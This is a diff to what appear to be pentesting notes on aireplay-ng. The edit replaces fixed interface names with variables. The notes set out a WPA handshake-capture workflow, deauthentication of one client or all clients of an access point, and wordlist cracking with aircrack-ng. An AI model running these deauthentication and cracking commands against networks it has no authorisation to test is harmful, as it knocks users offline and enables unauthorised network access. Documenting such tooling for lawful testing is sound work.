@@ -4,14 +4,17 @@ Used to inject/replay frames. The primary function is to generate traffic for la
 
 Here's the normal workflow.
 
+* Run [setup](../setup.md) first
+
 ```bash
-sudo airmon-ng -c $CHANNEL wlan0
+
+sudo airmon-ng -c $CHANNEL $DEVICE
 
 # Terminal 1
-sudo airodump-ng -c $CHANNEL --bssid $BSSID --output-format pcap -w $TAG wlan0mon
+sudo airodump-ng -c $CHANNEL --bssid $BSSID --output-format pcap -w $TAG $INTERFACE
 
 # Terminal 2
-sudo aireplay-ng --deauth 7 -a $BSSID -c $CLIENT wlan0mon
+sudo aireplay-ng --deauth 7 -a $BSSID -c $CLIENT $INTERFACE
 
 # Wait for found handshake message from airodump-ng then stop everything
 
@@ -23,24 +26,23 @@ sudo aircrack-ng -w $WORDLIST -b $BSSID -e $SSID $PCAP
 
 ```bash
 # Test if injection works for given interface
-sudo aireplay-ng --test wlan0mon
+sudo aireplay-ng --test $INTERFACE
 
-# Test injection between two interfaces
-sudo aireplay-ng --test -i wlan1mon wlan0mon
+# Test injection between two interfaces (if two exists)
+sudo aireplay-ng --test -i $INTERFACE2 $INTERFACE
 
 # Test injection in a specific AP
-sudo aireplay-ng -e $SSID -a $BSSID wlan0mon
+sudo aireplay-ng -e $SSID -a $BSSID $INTERFACE
 
 # Test injection in a specific AP without expecting to receive probes
-sudo aireplay-ng -e $SSID -a $BSSID -D wlan0mon
+sudo aireplay-ng -e $SSID -a $BSSID -D $INTERFACE
 
 # Deauthenticate a specific client connected to an AP
-sudo aireplay-ng --deauth 7 -a $BSSID -c $CLIENT wlan0mon
+sudo aireplay-ng --deauth 7 -a $BSSID -c $CLIENT $INTERFACE
 
 # Deauthenticate ALL clients connected to an AP
-sudo aireplay-ng --deauth 7 -a $BSSID wlan0mon
+sudo aireplay-ng --deauth 7 -a $BSSID $INTERFACE
 ```
-
 
 ## Attack Modes
 
